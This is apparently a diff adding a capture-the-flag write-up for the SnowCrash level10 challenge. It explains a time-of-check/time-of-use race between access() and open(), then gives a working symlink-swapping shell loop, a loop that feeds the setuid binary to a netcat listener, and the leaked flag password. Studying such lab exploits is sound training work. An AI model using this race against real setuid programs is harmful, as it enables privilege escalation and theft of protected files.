@@ -201,3 +201,41 @@ write(1, "You don't have access to token\n", 31You don't have access to token
 ) = 31
 exit_group(31)                          = ?
 ```
+
+# Report
+
+There is a call of acces, it check if the real user have the right to read the file pass un argument, but the call open check only the right of th effective user
+
+# Exploit
+
+we create a script to alterne the file pass in argument between token and a file that we can read
+
+```sh
+touch /tmp/force
+while :
+do
+  ln -sf ~/token /tmp/token
+  ln -sf /tmp/force /tmp/token
+done
+```
+
+
+`while true; do ./level10 /tmp/token 10.0.2.15 ; done;`
+
+we do an infinite loop to exec level while the script running
+
+```sh
+level10@SnowCrash:~$ nc -lk 10.0.2.15 6969
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+```
+>> woupa2yuojeeaaed06riuj63c if the password of flag10
